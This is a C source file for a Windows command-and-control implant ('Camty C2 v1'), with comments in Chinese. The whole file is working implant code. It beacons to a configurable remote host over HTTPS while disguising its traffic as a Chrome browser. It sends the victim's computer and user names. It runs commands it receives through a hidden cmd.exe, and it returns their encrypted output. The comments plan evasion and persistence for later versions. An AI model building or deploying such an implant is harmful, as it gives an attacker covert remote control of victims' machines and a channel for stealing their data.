/* Camty C2 植入体 v1（功能基线）。
 *
 * 构建参数（build.ps1 注入）：C2_HOST / C2_PORT / C2_PSK_HEX / C2_SLEEP
 * 运行时覆盖（便于联调，v2 收紧）：环境变量 C2_HOST / C2_PORT / C2_SLEEP
 *
 * v1 边界（docs/c2-design.md）：
 *  - 无持久化（进程结束即消亡）
 *  - IV 来自 rand()（srand=GetTickCount）
 *  - 无规避层：正常进程、明文 PE、CreateProcess 执行
 *  - 任务输出上限 64KB
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "crypto.h"

#define _STR(x) #x
#define _STR2(x) _STR(x)

#ifndef C2_PSK_HEX
#error "build.ps1 必须注入 -DC2_PSK_HEX=<64 位 hex>"
#endif
#ifndef C2_SLEEP
#define C2_SLEEP 3
#endif
/* 伪装 profile（build.ps1 注入 *_RAW 裸 token 后字符串化；运行时环境变量覆盖）：
 * C2_PATH_BEACON/C2_PATH_RESULT 与服务端 --beacon-path/--result-path 一致；
 * C2_UA/C2_CTYPE 伪装 UA 与 Content-Type；HTTP/1.1。默认保持 /beacon /result 兼容。 */
#ifdef C2_HOST_RAW
#define C2_HOST _STR2(C2_HOST_RAW)
#else
#define C2_HOST "127.0.0.1"
#endif
#ifdef C2_PATH_BEACON_RAW
#define C2_PATH_BEACON _STR2(C2_PATH_BEACON_RAW)
#else
#define C2_PATH_BEACON "/beacon"
#endif
#ifdef C2_PATH_RESULT_RAW
#define C2_PATH_RESULT _STR2(C2_PATH_RESULT_RAW)
#else
#define C2_PATH_RESULT "/result"
#endif
#ifndef C2_UA
#define C2_UA "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
#endif
#ifndef C2_CTYPE
#define C2_CTYPE "application/json"
#endif

#define OUT_MAX 65536
#define HTTP_BUF_MAX 262144

static uint8_t PSK[32];

static const char *env_or(const char *name, const char *fallback)
{
    const char *v = getenv(name);
    return (v && *v) ? v : fallback;
}

static int hex2bytes(const char *hex, uint8_t *out, size_t out_len)
{
    if (strlen(hex) != out_len * 2) return -1;
    for (size_t i = 0; i < out_len; i++) {
        unsigned b;
        if (sscanf(hex + 2 * i, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

/* ---------- JSON 小工具（协议由我方服务端生成，结构固定） ---------- */

static void json_escape(const char *src, size_t n, char *dst, size_t dst_max)
{
    size_t o = 0;
    for (size_t i = 0; i < n && o + 8 < dst_max; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '"' || c == '\\') { dst[o++] = '\\'; dst[o++] = (char)c; }
        else if (c == '\n') { dst[o++] = '\\'; dst[o++] = 'n'; }
        else if (c == '\r') { dst[o++] = '\\'; dst[o++] = 'r'; }
        else if (c == '\t') { dst[o++] = '\\'; dst[o++] = 't'; }
        else if (c < 0x20) { o += (size_t)snprintf(dst + o, 7, "\\u%04x", c); }
        else dst[o++] = (char)c;
    }
    dst[o] = 0;
}

static void json_unescape(const char *src, size_t n, char *dst, size_t dst_max)
{
    size_t o = 0;
    for (size_t i = 0; i < n && o + 1 < dst_max; i++) {
        if (src[i] == '\\' && i + 1 < n) {
            char c = src[++i];
            switch (c) {
            case 'n': dst[o++] = '\n'; break;
            case 'r': dst[o++] = '\r'; break;
            case 't': dst[o++] = '\t'; break;
            case '"': case '\\': case '/': dst[o++] = c; break;
            case 'u': {
                if (i + 4 >= n) break;
                unsigned v = 0;
                for (int k = 1; k <= 4; k++) {
                    char h = src[i + k];
                    v = v * 16 + (unsigned)(h <= '9' ? h - '0' : (h | 0x20) - 'a' + 10);
                }
                i += 4;
                if (v < 0x80) dst[o++] = (char)v;
                else dst[o++] = '?'; /* v1 输出按字节处理 */
                break;
            }
            default: dst[o++] = c;
            }
        } else {
            dst[o++] = src[i];
        }
    }
    dst[o] = 0;
}

/* 取 "key":"value" 的 value（不反转义），返回 value 结束位置，找不到返回 NULL */
static const char *json_get_string(const char *p, const char *key, const char **end_out)
{
    char pat[64];
    snprintf(pat, sizeof pat, "\"%s\":\"", key);
    const char *v = strstr(p, pat);
    if (!v) return NULL;
    v += strlen(pat);
    const char *e = v;
    while (*e) {
        if (e[0] == '\\' && e[1]) { e += 2; continue; }
        if (e[0] == '"') break;
        e++;
    }
    if (!*e) return NULL;
    if (end_out) *end_out = e;
    return v;
}

/* ---------- 最小 HTTP 客户端（WinHTTP：HTTPS 走系统 schannel，零新依赖） ---------- */

#ifdef C2_SCHEME_RAW
#define C2_SCHEME _STR2(C2_SCHEME_RAW)
#else
#define C2_SCHEME "https"
#endif
#ifndef C2_TLS_VERIFY
#define C2_TLS_VERIFY 1   /* 生产校验证书；测试自签可置 0 */
#endif

static void to_wide(const char *src, wchar_t *dst, size_t dst_max)
{
    size_t i = 0;
    for (; src[i] && i + 1 < dst_max; i++) dst[i] = (wchar_t)(unsigned char)src[i];
    dst[i] = 0;
}

static int http_post(const char *path, const uint8_t *body, size_t body_len,
                     uint8_t *resp, size_t resp_max, size_t *resp_len)
{
    const char *host = env_or("C2_HOST", C2_HOST);
    const char *scheme = env_or("C2_SCHEME", C2_SCHEME);
    char port_buf[16];
#ifdef C2_PORT
    snprintf(port_buf, sizeof port_buf, "%d", C2_PORT);
#else
    snprintf(port_buf, sizeof port_buf, "%s", "8800");
#endif
    const char *port_s = env_or("C2_PORT", port_buf);
    const char *hp = strstr(host, "://");
    if (hp) {
        if (strncmp(host, "https", 5) == 0) scheme = "https";
        else if (strncmp(host, "http", 4) == 0) scheme = "http";
        host = hp + 3;
    }
    BOOL secure = (strncmp(scheme, "https", 5) == 0);
    INTERNET_PORT port = (INTERNET_PORT)atoi(port_s);
    char hostname[128];
    const char *colon = strrchr(host, ':');
    if (colon && strchr(host, ':') == colon) {
        size_t n = (size_t)(colon - host);
        if (n >= sizeof hostname) n = sizeof hostname - 1;
        memcpy(hostname, host, n);
        hostname[n] = 0;
        port = (INTERNET_PORT)atoi(colon + 1);
        host = hostname;
    }
    const char *ua = env_or("C2_UA", C2_UA);
    const char *ctype = env_or("C2_CTYPE", C2_CTYPE);

    wchar_t whost[160], wpath[256], wua[400], whdrs[256];
    to_wide(host, whost, sizeof whost / sizeof whost[0]);
    to_wide(path, wpath, sizeof wpath / sizeof wpath[0]);
    to_wide(ua, wua, sizeof wua / sizeof wua[0]);
    char hdrs[256];
    snprintf(hdrs, sizeof hdrs, "Content-Type: %s\r\nAccept: */*\r\n", ctype);
    to_wide(hdrs, whdrs, sizeof whdrs / sizeof whdrs[0]);

    HINTERNET ses = WinHttpOpen(wua, WINHTTP_ACCESS_TYPE_NO_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses) return -1;
    HINTERNET conn = WinHttpConnect(ses, whost, port, 0);
    if (!conn) { WinHttpCloseHandle(ses); return -1; }
    HINTERNET req = WinHttpOpenRequest(conn, L"POST", wpath, NULL,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       secure ? WINHTTP_FLAG_SECURE : 0);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(ses); return -1; }
    if (secure && !C2_TLS_VERIFY) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                    | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                    | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                    | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags);
    }
    BOOL ok = WinHttpSendRequest(req, whdrs, (DWORD)-1,
                                 (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)
           && WinHttpReceiveResponse(req, NULL);
    if (!ok) { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(ses); return -1; }

    DWORD status = 0, ssize = sizeof status;
    WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &ssize, WINHTTP_NO_HEADER_INDEX);
    size_t total = 0;
    if (status == 200) {
        DWORD avail = 0;
        while (total + 1 < resp_max && WinHttpQueryDataAvailable(req, &avail) && avail) {
            DWORD read_n = 0;
            if (!WinHttpReadData(req, (LPVOID)(resp + total), avail, &read_n) || read_n == 0)
                break;
            total += read_n;
        }
    }
    WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(ses);
    if (status != 200) return -1;
    *resp_len = total;
    return 0;
}

/* ---------- 命令执行（管道捕获，输出并入 stderr） ---------- */

static int run_cmd(const char *command, char *out, size_t out_max, int *exit_code)
{
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof sa; sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE;
    HANDLE out_rd = NULL, out_wr = NULL;
    if (!CreatePipe(&out_rd, &out_wr, &sa, 0)) return -1;
    SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);

    char *cmdline = (char *)malloc(strlen(command) + 32);
    sprintf(cmdline, "cmd.exe /c %s", command);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = NULL;
    si.hStdOutput = out_wr;
    si.hStdError = out_wr;
    memset(&pi, 0, sizeof pi);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        CloseHandle(out_rd); CloseHandle(out_wr); free(cmdline);
        return -1;
    }
    CloseHandle(out_wr);
    free(cmdline);

    size_t total = 0;
    DWORD n;
    while (total + 1 < out_max
           && ReadFile(out_rd, out + total, (DWORD)(out_max - total - 1), &n, NULL)
           && n) {
        total += n;
    }
    WaitForSingleObject(pi.hProcess, 60000);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(out_rd);
    out[total] = 0;
    *exit_code = (int)code;
    return 0;
}

/* ---------- 主循环 ---------- */

static void build_beacon_json(char *buf, size_t buf_max, const char *id,
                              const char *host, const char *user, const char *arch, int sleep)
{
    snprintf(buf, buf_max,
             "{\"id\":\"%s\",\"host\":\"%s\",\"user\":\"%s\",\"arch\":\"%s\",\"sleep\":%d}",
             id, host, user, arch, sleep);
}

int main(void)
{
    if (hex2bytes(_STR2(C2_PSK_HEX), PSK, sizeof PSK) != 0) return 1;
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    srand((unsigned)GetTickCount());

    char host[64], user[64], arch[32], id[96];
    DWORD sz;
    sz = sizeof host; GetComputerNameA(host, &sz);
    sz = sizeof user; GetUserNameA(user, &sz);
    const char *arch_env = getenv("PROCESSOR_ARCHITECTURE");
    snprintf(arch, sizeof arch, "%s", arch_env ? arch_env : "x64");
    snprintf(id, sizeof id, "%s-%04X", host, (unsigned)rand() & 0xFFFF);

    int sleep_s = atoi(env_or("C2_SLEEP", "0"));
    if (sleep_s <= 0) sleep_s = C2_SLEEP;

    uint8_t *req = (uint8_t *)malloc(HTTP_BUF_MAX);
    uint8_t *resp = (uint8_t *)malloc(HTTP_BUF_MAX);
    uint8_t *plain = (uint8_t *)malloc(HTTP_BUF_MAX);
    char *beacon_json = (char *)malloc(512);
    char *command = (char *)malloc(16384);
    char *escaped = (char *)malloc(OUT_MAX * 6 + 16);
    char *result_json = (char *)malloc(OUT_MAX * 6 + 256);

    for (;;) {
        build_beacon_json(beacon_json, 512, id, host, user, arch, sleep_s);
        size_t sealed_len = 0, resp_len = 0, plain_len = 0;
        int have_tasks = 0;
        if (cmt1_seal(PSK, (const uint8_t *)beacon_json, strlen(beacon_json),
                      req, &sealed_len) == 0
            && http_post(env_or("C2_PATH_BEACON", C2_PATH_BEACON),
                         req, sealed_len, resp, HTTP_BUF_MAX, &resp_len) == 0
            && cmt1_open(PSK, resp, resp_len, plain, &plain_len) == 0) {
            plain[plain_len] = 0;
            /* 逐个提取任务并执行。服务端格式固定：{"tasks":[{"id":"..","command":".."}]} */
            const char *scan = (const char *)plain;
            for (;;) {
                const char *id_end = NULL;
                const char *task_id = json_get_string(scan, "id", &id_end);
                if (!task_id) break;
                const char *next_id = strstr(id_end, "\"id\":\"");
                const char *cmd_v = json_get_string(id_end, "command", NULL);
                if (!cmd_v || (next_id && cmd_v > next_id)) {
                    scan = id_end;  /* 本任务无 command（非 cmd 类），跳过 */
                    continue;
                }
                const char *cmd_end = NULL;
                cmd_v = json_get_string(id_end, "command", &cmd_end);
                json_unescape(cmd_v, (size_t)(cmd_end - cmd_v), command, 16384);

                static char output[OUT_MAX];
                int exit_code = -1;
                if (run_cmd(command, output, sizeof output, &exit_code) != 0) {
                    strcpy(output, "(execution failed)");
                    exit_code = -1;
                }
                json_escape(output, strlen(output), escaped, OUT_MAX * 6 + 16);
                size_t id_len = (size_t)(id_end - task_id);
                snprintf(result_json, OUT_MAX * 6 + 256,
                         "{\"results\":[{\"task_id\":\"%.*s\",\"output\":\"%s\",\"exit\":%d}]}",
                         (int)id_len, task_id, escaped, exit_code);
                size_t r_sealed = 0, r_resp = 0, r_plain = 0;
                if (cmt1_seal(PSK, (const uint8_t *)result_json, strlen(result_json),
                             req, &r_sealed) == 0) {
                    http_post(env_or("C2_PATH_RESULT", C2_PATH_RESULT),
                              req, r_sealed, resp, HTTP_BUF_MAX, &r_resp);
                    cmt1_open(PSK, resp, r_resp, plain, &r_plain); /* ack，忽略内容 */
                }
                have_tasks = 1;
                scan = cmd_end;
            }
            (void)have_tasks;
        }
        DWORD jitter = (DWORD)(sleep_s * 1000);
        jitter = jitter * 8 / 10 + (DWORD)(jitter * 4 / 10 * (rand() / (double)RAND_MAX));
        Sleep(jitter);
    }
}
